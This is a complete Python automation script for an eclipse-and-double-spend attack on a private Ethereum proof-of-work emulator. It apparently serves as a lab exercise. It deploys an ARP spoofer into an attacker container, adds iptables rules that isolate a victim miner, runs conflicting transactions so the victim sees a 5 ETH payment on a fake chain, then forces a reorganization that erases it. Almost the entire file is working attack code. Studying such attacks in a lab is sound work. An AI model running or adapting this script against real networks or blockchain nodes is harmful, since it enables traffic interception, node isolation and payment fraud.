#!/usr/bin/env python3
"""
ARP Eclipse Attack & Double Spend: Full Automation Script
Private Ethereum PoW Emulator

Topology:
  Real World:  Node 160 (BootNode Miner)  10.160.0.71
               Node 161 (Miner)            10.161.0.71
  Victim:      Node 162 (Miner)            10.162.0.71
  Attacker:    Node 162 (new eth node)     10.162.0.74

Run from the Host VM (not inside a container).
Requires:
  - docker CLI available
  - arp_spoof.py already present on host at ./arp_spoof.py
  - Python packages: web3, eth_account  (pip install web3 eth-account)

Usage:
  python3 eclipse_attack.py [--skip-reorg]   # --skip-reorg skips Phase 3
"""

import subprocess
import sys
import time
import argparse
import signal
import textwrap
from datetime import datetime
from web3 import Web3

# ──────────────────────────────────────────────
# CONFIG
# ──────────────────────────────────────────────
CONTAINERS = {
    "node160": "as160h-Ethereum-POW-00-Miner-BootNode-10.160.0.71",
    "node161": "as161h-Ethereum-POW-01-Miner-10.161.0.71",
    "node162": "as162h-Ethereum-POW-02-Miner-10.162.0.71",
    "attacker": "as162h-new_eth_node-10.162.0.74",
}
RPC = {
    "node160": "http://10.160.0.71:8545",
    "node161": "http://10.161.0.71:8545",
    "node162": "http://10.162.0.71:8545",
}
ADDR_ORIGIN  = "0xCBF1e330F0abD5c1ac979CF2B2B874cfD4902E24"
ADDR_VICTIM  = "0xF5406927254d2dA7F7c28A61191e3Ff1f2400fe9"
ADDR_BOB     = "0xaB5AaD8284868B91Eb537d28aB1A159740D54890"
ARP_SPOOF_SRC = "./arp_spoof.py"
ARP_SPOOF_DST = "/tmp/arp_spoof.py"
FAKE_TX_SCRIPT = "./fake_tx.py"
REAL_TX_SCRIPT = "./real_tx.py"

POLL_INTERVAL     = 3    # seconds between polls
PEER_POLL_TIMEOUT = 90   # max seconds to wait for peers to appear
BLOCK_ADVANCE_TIMEOUT = 120  # max seconds to wait for blocks to advance

arp_proc = None  # global so signal handler can clean up

# ──────────────────────────────────────────────
# LOGGING
# ──────────────────────────────────────────────
RESET  = "\033[0m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
WHITE  = "\033[97m"
MAGENTA= "\033[95m"

def ts():
    return datetime.now().strftime("%H:%M:%S")

def log(msg, color=WHITE):
    print(f"{DIM}[{ts()}]{RESET} {color}{msg}{RESET}")

def log_phase(n, title):
    bar = "═" * 60
    print(f"\n{CYAN}{BOLD}{bar}{RESET}")
    print(f"{CYAN}{BOLD}  PHASE {n}: {title}{RESET}")
    print(f"{CYAN}{BOLD}{bar}{RESET}\n")

def log_ok(msg):
    print(f"{DIM}[{ts()}]{RESET} {GREEN}{BOLD}✔  {msg}{RESET}")

def log_warn(msg):
    print(f"{DIM}[{ts()}]{RESET} {YELLOW}{BOLD}⚠  {msg}{RESET}")

def log_err(msg):
    print(f"{DIM}[{ts()}]{RESET} {RED}{BOLD}✘  {msg}{RESET}")

def log_info(msg):
    print(f"{DIM}[{ts()}]{RESET} {CYAN}→  {msg}{RESET}")

def log_balances(label, origin, victim, bob):
    print(f"\n  {BOLD}{WHITE}{'─'*50}{RESET}")
    print(f"  {BOLD}{WHITE}Balances [{label}]{RESET}")
    print(f"  {WHITE}Origin  {ADDR_ORIGIN[:12]}…  {CYAN}{BOLD}{origin:.4f} ETH{RESET}")
    print(f"  {WHITE}Victim  {ADDR_VICTIM[:12]}…  {CYAN}{BOLD}{victim:.4f} ETH{RESET}")
    print(f"  {WHITE}Bob     {ADDR_BOB[:12]}…  {CYAN}{BOLD}{bob:.4f} ETH{RESET}")
    print(f"  {BOLD}{WHITE}{'─'*50}{RESET}\n")

def abort(msg):
    log_err(f"FATAL: {msg}")
    sys.exit(1)

# ──────────────────────────────────────────────
# DOCKER / SHELL HELPERS
# ──────────────────────────────────────────────
def docker_exec(container, cmd, check=True):
    """Run a command inside a container, return stdout string."""
    full = ["docker", "exec", container] + (["sh", "-c", cmd] if isinstance(cmd, str) else cmd)
    r = subprocess.run(full, capture_output=True, text=True)
    if check and r.returncode != 0:
        raise RuntimeError(f"docker exec failed [{r.returncode}]: {r.stderr.strip()}")
    return r.stdout.strip()

def geth_exec(container, js, check=True):
    """Run a geth attach --exec JS snippet, return stdout."""
    return docker_exec(container, f'geth attach --exec "{js}" /root/.ethereum/geth.ipc', check=check)

def host_run(cmd, check=True, capture=True):
    """Run a shell command on the host VM."""
    r = subprocess.run(cmd, shell=True, capture_output=capture, text=True)
    if check and r.returncode != 0:
        raise RuntimeError(f"Host command failed: {r.stderr.strip()}")
    return r.stdout.strip() if capture else None

# ──────────────────────────────────────────────
# WEB3 HELPERS
# ──────────────────────────────────────────────
def make_w3(node_key):
    return Web3(Web3.HTTPProvider(RPC[node_key]))

def wei_to_eth(v):
    return float(Web3.fromWei(v, "ether"))

def get_balances_eth(w3):
    o = wei_to_eth(w3.eth.get_balance(ADDR_ORIGIN))
    v = wei_to_eth(w3.eth.get_balance(ADDR_VICTIM))
    b = wei_to_eth(w3.eth.get_balance(ADDR_BOB))
    return o, v, b

# ──────────────────────────────────────────────
# POLLING UTILITIES
# ──────────────────────────────────────────────
def wait_for(condition_fn, timeout, poll=POLL_INTERVAL, label="condition"):
    """Poll condition_fn() until it returns truthy or timeout expires."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            result = condition_fn()
            if result:
                return result
        except Exception as e:
            log_warn(f"  poll '{label}' error: {e}")
        remaining = int(deadline - time.time())
        log(f"  Waiting for {label} … ({remaining}s left)", DIM)
        time.sleep(poll)
    return None

def wait_for_rpc(node_key, timeout=120):
    """Block until the RPC endpoint is responsive."""
    log_info(f"Waiting for RPC on {node_key} ({RPC[node_key]}) …")
    def check():
        try:
            w3 = make_w3(node_key)
            return w3.isConnected()
        except Exception:
            return False
    r = wait_for(check, timeout, label=f"{node_key} RPC")
    if not r:
        abort(f"RPC on {node_key} never came up after {timeout}s")
    log_ok(f"RPC on {node_key} is live")
    return make_w3(node_key)

def wait_for_all_mining(nodes, timeout=BLOCK_ADVANCE_TIMEOUT):
    """
    Snapshot block numbers for all nodes at once, then poll until every node
    has advanced past its starting block. nodes = {label: w3_instance}.
    """
    log_info("Snapshotting initial block heights for all nodes ...")
    initial = {}
    for label, w3 in nodes.items():
        try:
            initial[label] = w3.eth.block_number
        except Exception:
            initial[label] = None
        log(f"  {label}: block {initial[label]}", DIM)

    log_info("Waiting for ALL nodes to advance at least one block ...")
    def all_advanced():
        statuses = {}
        for label, w3 in nodes.items():
            try:
                bn = w3.eth.block_number
                statuses[label] = (initial[label] is not None and bn > initial[label], bn)
            except Exception:
                statuses[label] = (False, "?")
        status_str = "  " + "  ".join(
            f"{l}:{v[1]}({'ok' if v[0] else '...'})" for l, v in statuses.items()
        )
        log(status_str, DIM)
        return all(v[0] for v in statuses.values())

    result = wait_for(all_advanced, timeout, label="all nodes mining")
    if not result:
        abort(f"Not all nodes advanced blocks within {timeout}s -- check miner status")
    log_ok("All nodes are mining!")

def get_peer_count(container):
    """Return peer count as int, or -1 on error."""
    try:
        raw = geth_exec(container, "admin.peers.length", check=False)
        return int(raw.strip())
    except Exception:
        return -1

# ──────────────────────────────────────────────
# PHASE 0 — PRE-FLIGHT
# ──────────────────────────────────────────────
def phase0_preflight():
    log_phase(0, "PRE-FLIGHT CHECKS")

    # 1. Check docker
    log_info("Checking docker availability …")
    try:
        host_run("docker info", check=True)
        log_ok("Docker is running")
    except Exception:
        abort("Docker not available on host")

    # 2. Check all containers are up
    log_info("Checking all containers are running …")
    for name, cname in CONTAINERS.items():
        r = subprocess.run(["docker", "inspect", "-f", "{{.State.Running}}", cname],
                           capture_output=True, text=True)
        if "true" not in r.stdout:
            abort(f"Container {name} ({cname}) is NOT running. Run 'dcup' first.")
        log_ok(f"  Container {name}: running")

    # 3. Check arp_spoof.py exists on host
    log_info("Checking arp_spoof.py …")
    try:
        host_run(f"test -f {ARP_SPOOF_SRC}")
        log_ok(f"Found {ARP_SPOOF_SRC}")
    except Exception:
        abort(f"arp_spoof.py not found at {ARP_SPOOF_SRC} — place it next to this script")

    # 4. Wait for RPC on all miner nodes
    w3_160 = wait_for_rpc("node160")
    w3_161 = wait_for_rpc("node161")
    w3_162 = wait_for_rpc("node162")

    # 5. Wait for all nodes to be mining (blocks advancing)
    wait_for_all_mining({"node160": w3_160, "node161": w3_161, "node162": w3_162})

    # 6. Check block heights are in sync (rough)
    b160 = w3_160.eth.block_number
    b161 = w3_161.eth.block_number
    b162 = w3_162.eth.block_number
    log_info(f"Block heights — 160: {b160}  161: {b161}  162: {b162}")
    if abs(b160 - b162) > 10:
        log_warn("Block heights differ by more than 10 — nodes may not be synced yet")
    else:
        log_ok("Block heights look consistent")

    # 7. Show pre-attack balances
    o, v, b = get_balances_eth(w3_160)
    log_balances("Pre-Attack (Node 160)", o, v, b)
    if o < 2.0:
        abort(f"Origin account only has {o:.4f} ETH — need at least 2 ETH to execute double spend")

    # 8. Check node 162 peer count (should be > 0 before attack)
    peers = get_peer_count(CONTAINERS["node162"])
    log_info(f"Node 162 peer count before attack: {peers}")
    if peers == 0:
        log_warn("Node 162 already has 0 peers — check network; it may not be connected")
    else:
        log_ok(f"Node 162 is connected ({peers} peers)")

    log_ok("Pre-flight complete — all systems go\n")
    return w3_160, w3_161, w3_162

# ──────────────────────────────────────────────
# PHASE 1 — ECLIPSE ATTACK
# ──────────────────────────────────────────────
def phase1_eclipse():
    log_phase(1, "ECLIPSE ATTACK — ISOLATING NODE 162")
    global arp_proc

    # Copy arp_spoof.py into attacker container
    log_info("Copying arp_spoof.py into attacker container …")
    r = subprocess.run(
        ["docker", "cp", ARP_SPOOF_SRC, f"{CONTAINERS['attacker']}:{ARP_SPOOF_DST}"],
        capture_output=True, text=True
    )
    if r.returncode != 0:
        abort(f"docker cp failed: {r.stderr.strip()}")
    log_ok("arp_spoof.py copied to attacker container")

    # Enable IP forwarding in attacker container
    log_info("Enabling IP forwarding in attacker container …")
    docker_exec(CONTAINERS["attacker"], "sysctl -w net.ipv4.ip_forward=1")
    log_ok("IP forwarding enabled")

    # Launch arp_spoof.py as background subprocess
    log_info("Starting ARP poisoning (background) …")
    arp_proc = subprocess.Popen(
        ["docker", "exec", CONTAINERS["attacker"], "python3", ARP_SPOOF_DST],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
    )
    # Give it a moment to resolve MACs and send first packets
    time.sleep(3)
    if arp_proc.poll() is not None:
        out = arp_proc.stdout.read()
        abort(f"ARP spoof process died immediately:\n{out}")
    log_ok(f"ARP spoof running (PID {arp_proc.pid})")

    # Add iptables DROP rules
    log_info("Installing iptables DROP rules for Node 162 traffic …")
    rules = [
        "iptables -A FORWARD -s 10.162.0.71 -p tcp -j REJECT --reject-with tcp-reset",
        "iptables -A FORWARD -d 10.162.0.71 -p tcp -j REJECT --reject-with tcp-reset",
        "iptables -A FORWARD -s 10.162.0.71 -p udp -j DROP",
        "iptables -A FORWARD -d 10.162.0.71 -p udp -j DROP",
    ]
    for rule in rules:
        docker_exec(CONTAINERS["attacker"], rule)
    log_ok("iptables DROP rules installed")

    # Verify eclipse: poll until peer count drops to 0
    log_info("Verifying eclipse — waiting for Node 162 peer count to reach 0 …")
    def check_isolated():
        p = get_peer_count(CONTAINERS["node162"])
        log(f"  Node 162 peers: {p}", DIM)
        return p == 0
    result = wait_for(check_isolated, timeout=60, label="peer count == 0")
    if not result:
        log_warn("Node 162 still has peers after 60s — eclipse may be partial. Continuing anyway.")
    else:
        log_ok("Eclipse confirmed! Node 162 has 0 peers — it is ISOLATED")

    # Verify ARP table poisoning
    log_info("Checking ARP table on Node 162 (router MAC should be attacker's) …")
    arp_table = docker_exec(CONTAINERS["node162"], "ip neigh show 10.162.0.254", check=False)
    log(f"  ARP entry for gateway: {arp_table}", YELLOW)

    log_ok("Phase 1 complete — Node 162 is eclipsed\n")

# ──────────────────────────────────────────────
# PHASE 2 — DOUBLE SPEND
# ──────────────────────────────────────────────
def stream_script(script_path, label, results):
    """
    Run a tx script in a thread, print each output line as it arrives.
    stdout is line-buffered by forcing PYTHONUNBUFFERED=1.
    Stores returncode in results[label].
    """
    import os
    env = os.environ.copy()
    env["PYTHONUNBUFFERED"] = "1"
    env["PYTHONWARNINGS"] = "ignore"
    proc = subprocess.Popen(
        [sys.executable, "-u", script_path],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1, env=env
    )
    for line in proc.stdout:
        line = line.rstrip()
        if not line:
            continue
        if line.startswith("[+]"):
            log_ok(f"  [{label}] {line}")
        elif line.startswith("[*]"):
            log_info(f"  [{label}] {line}")
        elif line.startswith("[!]"):
            log_warn(f"  [{label}] {line}")
        else:
            log(f"  [{label}] {line}", DIM)
    proc.wait()
    results[label] = proc.returncode


def run_tx_scripts_concurrently():
    """Launch fake_tx.py and real_tx.py at the same time, stream both outputs."""
    import threading
    results = {}
    t_fake = threading.Thread(target=stream_script,
                              args=(FAKE_TX_SCRIPT, "FAKE", results), daemon=True)
    t_real = threading.Thread(target=stream_script,
                              args=(REAL_TX_SCRIPT, "REAL", results), daemon=True)
    t_fake.start()
    t_real.start()
    t_fake.join()
    t_real.join()
    if results.get("FAKE", 1) != 0:
        abort(f"{FAKE_TX_SCRIPT} exited with code {results.get('FAKE')}")
    if results.get("REAL", 1) != 0:
        abort(f"{REAL_TX_SCRIPT} exited with code {results.get('REAL')}")



# ──────────────────────────────────────────────
# MINER MANAGEMENT
# ──────────────────────────────────────────────
def ensure_mining(node_key, w3):
    """
    Make sure the miner is running by checking if the block advances.
    If not, do a stop/setEtherbase/start cycle and verify again.
    """
    log_info(f"Verifying {node_key} miner is active ...")
    initial = w3.eth.block_number
    time.sleep(5)
    if w3.eth.block_number > initial:
        log_ok(f"  {node_key} is mining (block advanced)")
        return
    log_warn(f"  {node_key} block did not advance — restarting miner ...")
    cname = CONTAINERS[node_key]
    docker_exec(cname, 'geth attach --exec "miner.stop()" /root/.ethereum/geth.ipc', check=False)
    docker_exec(cname, 'geth attach --exec "miner.setEtherbase(eth.accounts[0])" /root/.ethereum/geth.ipc', check=False)
    docker_exec(cname, 'geth attach --exec "miner.start(1)" /root/.ethereum/geth.ipc', check=False)
    time.sleep(3)
    initial2 = w3.eth.block_number
    time.sleep(6)
    if w3.eth.block_number > initial2:
        log_ok(f"  {node_key} miner restarted successfully")
    else:
        log_warn(f"  {node_key} still not mining after restart — check container logs")

def phase2_double_spend(w3_160, w3_162):
    log_phase(2, "DOUBLE SPEND — DIVERGING THE CHAINS")

    # Sanity-check: verify the scripts exist before doing anything
    for path in (FAKE_TX_SCRIPT, REAL_TX_SCRIPT):
        try:
            host_run(f"test -f {path}")
        except Exception:
            abort(f"{path} not found — place it next to this script")

    # Node 162 may have its miner stalled — verify and restart if needed
    ensure_mining("node162", w3_162)

    # Show nonces on both chains so we can confirm they match (same pre-eclipse state)
    nonce_real = w3_160.eth.get_transaction_count(ADDR_ORIGIN)
    nonce_fake = w3_162.eth.get_transaction_count(ADDR_ORIGIN)
    log_info(f"Nonce on real chain (node160): {nonce_real}")
    log_info(f"Nonce on fake chain (node162): {nonce_fake}")
    if nonce_real != nonce_fake:
        log_warn(f"Nonces differ ({nonce_real} vs {nonce_fake}) — chains may already be diverged!")
    else:
        log_ok(f"Nonces match ({nonce_real}) — both chains see the same account state")

    # Launch fake_tx.py and real_tx.py concurrently -- both block until mined
    log_info("Launching fake_tx.py and real_tx.py concurrently ...")
    run_tx_scripts_concurrently()

    # ── Show diverged realities ───────────────────────────────────
    log_info("Fetching balances from both worlds …")
    o_real, v_real, b_real = get_balances_eth(w3_160)
    o_fake, v_fake, b_fake = get_balances_eth(w3_162)

    log_balances("REAL WORLD (Node 160)", o_real, v_real, b_real)
    log_balances("FAKE WORLD (Node 162)", o_fake, v_fake, b_fake)

    if b_real > 0.9:
        log_ok("Bob received 1 ETH on the real chain ✓")
    else:
        log_warn(f"Bob's real balance looks wrong: {b_real:.4f} ETH")

    if v_fake > v_real + 4.0:
        log_ok("Victim thinks they received 5 ETH (fake chain) — they're fooled! ✓")
    else:
        log_warn(f"Victim fake balance looks unexpected: {v_fake:.4f} ETH")

    real_block = w3_160.eth.block_number
    fake_block = w3_162.eth.block_number
    log_info(f"Chain lengths — Real: {real_block}  Fake: {fake_block}")
    if real_block > fake_block:
        log_ok(f"Real chain is longer by {real_block - fake_block} blocks — reorg will favour real chain")
    else:
        log_warn("Fake chain is currently longer! Real chain needs to catch up before Phase 3.")

    log_ok("Phase 2 complete — both realities exist simultaneously\n")
    return real_block, fake_block

# ──────────────────────────────────────────────
# PHASE 3 — CHAIN REORGANIZATION
# ──────────────────────────────────────────────
def phase3_reorg(w3_160, w3_162, real_block_at_p2, fake_block_at_p2):
    log_phase(3, "CHAIN REORGANIZATION — THE VANISH")
    global arp_proc

    # Wait until real chain is ahead by a safe margin before releasing victim.
    # A margin of 1 is too tight — the victim might still win a tie-break.
    # 5 blocks gives geth enough of a height difference to reorg immediately.
    REORG_MARGIN = 5
    log_info(f"Waiting for real chain to lead fake chain by at least {REORG_MARGIN} blocks ...")
    def real_chain_ahead_enough():
        r = w3_160.eth.block_number
        f = w3_162.eth.block_number
        margin = r - f
        log(f"  Real: {r}  Fake: {f}  margin: {margin:+d}  (need +{REORG_MARGIN})", DIM)
        return margin >= REORG_MARGIN
    result = wait_for(real_chain_ahead_enough, timeout=300, label=f"real chain +{REORG_MARGIN} blocks ahead")
    if not result:
        log_warn(f"Real chain never reached +{REORG_MARGIN} margin in 5 min — releasing anyway")
    else:
        margin = w3_160.eth.block_number - w3_162.eth.block_number
        log_ok(f"Real chain is ahead by {margin} blocks — safe margin reached, releasing victim")

    # ── Release the victim ───────────────────────────────────────
    log_info("Flushing iptables rules in attacker container …")
    docker_exec(CONTAINERS["attacker"], "iptables -F", check=False)
    docker_exec(CONTAINERS["attacker"], "iptables -F FORWARD", check=False)
    log_ok("iptables rules flushed")

    log_info("Terminating ARP spoof process …")
    if arp_proc and arp_proc.poll() is None:
        arp_proc.terminate()
        try:
            arp_proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            arp_proc.kill()
    log_ok("ARP spoof stopped")

    # Restore ARP tables by re-running spoof in restore-mode isn't available
    # so we simply let the victim reconnect and let Ethernet/ARP refresh naturally
    # Force reconnection via addPeer
    log_info("Getting BootNode enode URL ...")
    enode_raw = geth_exec(CONTAINERS["node160"], "admin.nodeInfo.enode")
    # Strip surrounding quotes geth attach adds, fix loopback IP
    enode = enode_raw.strip().strip('"').replace("127.0.0.1", "10.160.0.71")
    log_info(f"BootNode enode: {enode[:70]}...")

    # Write the JS to a temp file inside node162 to avoid shell quoting issues
    # with the enode string (which itself contains double quotes).
    log_info("Injecting BootNode peer into Node 162 via temp JS file ...")
    # Use JSON-RPC admin_addPeer directly — avoids all shell/geth quoting issues
    import urllib.request as _ureq, json as _json
    log_info("Calling admin_addPeer via JSON-RPC on Node 162 ...")
    try:
        body = _json.dumps({
            "jsonrpc": "2.0", "method": "admin_addPeer",
            "params": [enode], "id": 1
        }).encode()
        req = _ureq.Request(
            RPC["node162"], data=body,
            headers={"Content-Type": "application/json"}
        )
        resp = _json.loads(_ureq.urlopen(req, timeout=5).read())
        if resp.get("result"):
            log_ok(f"  admin_addPeer accepted: {resp['result']}")
        else:
            log_warn(f"  admin_addPeer response: {resp}")
    except Exception as e:
        log_warn(f"  admin_addPeer RPC failed: {e} — trying geth attach fallback")
        # Fallback: write JS to a file, avoiding inline quoting entirely
        docker_exec(CONTAINERS["node162"],
                    "printf '%s' 'admin.addPeer("" + enode + "")' > /tmp/addpeer.js",
                    check=False)
        r = docker_exec(CONTAINERS["node162"],
                        "geth attach /root/.ethereum/geth.ipc < /tmp/addpeer.js",
                        check=False)
        log(f"  geth attach result: {r[:80] if r else '(empty)'}", DIM)
    log_ok("Peer reconnection initiated")

    # Poll until Node 162 has peers again
    log_info("Waiting for Node 162 to reconnect to real network …")
    def has_peers():
        p = get_peer_count(CONTAINERS["node162"])
        log(f"  Node 162 peers: {p}", DIM)
        return p > 0
    result = wait_for(has_peers, timeout=PEER_POLL_TIMEOUT, label="Node 162 has peers")
    if not result:
        log_warn("Node 162 still has no peers — may need manual intervention")
    else:
        log_ok("Node 162 reconnected to real network!")

    # Poll until Node 162 block height matches real world (reorg happened)
    log_info("Waiting for Node 162 to sync with real chain (reorg in progress) …")
    def chains_synced():
        try:
            r = w3_160.eth.block_number
            f = w3_162.eth.block_number
            log(f"  Real: {r}  Victim (162): {f}", DIM)
            return abs(r - f) <= 2
        except Exception:
            return False
    result = wait_for(chains_synced, timeout=180, label="chains synced")
    if not result:
        log_warn("Chains did not fully sync within 3 min — partial reorg possible")
    else:
        log_ok("Node 162 has synced with the real chain — reorg complete!")

    # ── Final balance check on Node 162 ─────────────────────────
    log_info("Reading final balances from Node 162 (post-reorg) …")
    o_post, v_post, b_post = get_balances_eth(w3_162)
    log_balances("POST-REORG (Node 162)", o_post, v_post, b_post)

    # Verdict
    print(f"\n  {BOLD}{GREEN}{'═'*50}{RESET}")
    print(f"  {BOLD}{GREEN}  DOUBLE SPEND RESULT{RESET}")
    print(f"  {BOLD}{GREEN}{'═'*50}{RESET}")
    if b_post > 0.9:
        log_ok(f"Bob kept 1 ETH on the real chain ✓")
    else:
        log_warn(f"Bob's balance: {b_post:.4f} ETH (unexpected)")
    o_real_now, v_real_now, b_real_now = get_balances_eth(w3_160)
    if abs(v_post - v_real_now) < 0.5:
        log_ok(f"Victim balance on 162 ({v_post:.4f}) matches real chain ({v_real_now:.4f})")
        log_ok("Victim's 5 ETH payment VANISHED after reorg ✓")
        log_ok("The victim delivered goods for 5 ETH that no longer exist")
    else:
        log_warn(f"Victim on 162: {v_post:.4f} ETH  |  Real chain: {v_real_now:.4f} ETH  (may still be syncing)")
    if abs(b_post - b_real_now) < 0.1 or b_post > 0.9:
        log_ok(f"Bob's balance ({b_post:.4f} ETH) confirmed on real chain ✓")
    else:
        log_warn(f"Bob's balance: {b_post:.4f} ETH (unexpected — check real chain)")
    print(f"  {BOLD}{GREEN}{'═'*50}{RESET}\n")

    log_ok("Phase 3 complete — eclipse attack and double spend successful!\n")

# ──────────────────────────────────────────────
# SIGNAL HANDLER (emergency cleanup)
# ──────────────────────────────────────────────
def cleanup_on_interrupt(sig, frame):
    print(f"\n{YELLOW}{BOLD}[!] Interrupted — attempting emergency cleanup …{RESET}")
    global arp_proc
    try:
        subprocess.run(
            ["docker", "exec", CONTAINERS["attacker"], "iptables", "-F"],
            capture_output=True, timeout=5
        )
        subprocess.run(
            ["docker", "exec", CONTAINERS["attacker"], "iptables", "-F", "FORWARD"],
            capture_output=True, timeout=5
        )
        print(f"{GREEN}  iptables flushed{RESET}")
    except Exception as e:
        print(f"{RED}  iptables flush failed: {e}{RESET}")
    if arp_proc and arp_proc.poll() is None:
        arp_proc.terminate()
        print(f"{GREEN}  ARP spoof terminated{RESET}")
    print(f"{YELLOW}  Network may still be partially poisoned — wait ~30s for ARP to recover{RESET}")
    sys.exit(1)

# ──────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="Full Eclipse Attack & Double Spend automation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            Run from the Host VM directory where arp_spoof.py is located.
            Requires: docker, python3, web3, eth_account
        """)
    )
    parser.add_argument(
        "--skip-reorg", action="store_true",
        help="Stop after Phase 2 (skip chain reorganization)"
    )
    parser.add_argument(
        "--phase", type=int, choices=[0, 1, 2, 3], default=None,
        help="Run only up to this phase (0=preflight only, 1=eclipse only, etc.)"
    )
    args = parser.parse_args()

    signal.signal(signal.SIGINT, cleanup_on_interrupt)
    signal.signal(signal.SIGTERM, cleanup_on_interrupt)

    print(f"\n{CYAN}{BOLD}{'═'*60}{RESET}")
    print(f"{CYAN}{BOLD}  ECLIPSE ATTACK & DOUBLE SPEND — AUTOMATION SCRIPT{RESET}")
    print(f"{CYAN}{BOLD}  Ethereum PoW Private Emulator{RESET}")
    print(f"{CYAN}{BOLD}{'═'*60}{RESET}\n")
    print(f"  {DIM}Victim:   Node 162  10.162.0.71{RESET}")
    print(f"  {DIM}Attacker: Node 162  10.162.0.74{RESET}")
    print(f"  {DIM}Real net: Node 160  10.160.0.71  +  Node 161  10.161.0.71{RESET}\n")

    max_phase = args.phase if args.phase is not None else (2 if args.skip_reorg else 3)

    # Phase 0
    w3_160, w3_161, w3_162 = phase0_preflight()
    if max_phase == 0:
        log_ok("Stopped after pre-flight (--phase 0)")
        return

    # Phase 1
    phase1_eclipse()
    if max_phase == 1:
        log_ok("Stopped after eclipse (--phase 1)")
        log_warn("Remember to flush iptables manually when done!")
        return

    # Phase 2
    real_block, fake_block = phase2_double_spend(w3_160, w3_162)
    if max_phase == 2:
        log_ok("Stopped after double spend (--phase 2 / --skip-reorg)")
        log_warn("Node 162 is still isolated — run Phase 3 manually or flush iptables")
        return

    # Phase 3
    phase3_reorg(w3_160, w3_162, real_block, fake_block)

    print(f"\n{GREEN}{BOLD}  All phases complete. Attack demonstrated successfully.{RESET}\n")


if __name__ == "__main__":
    main()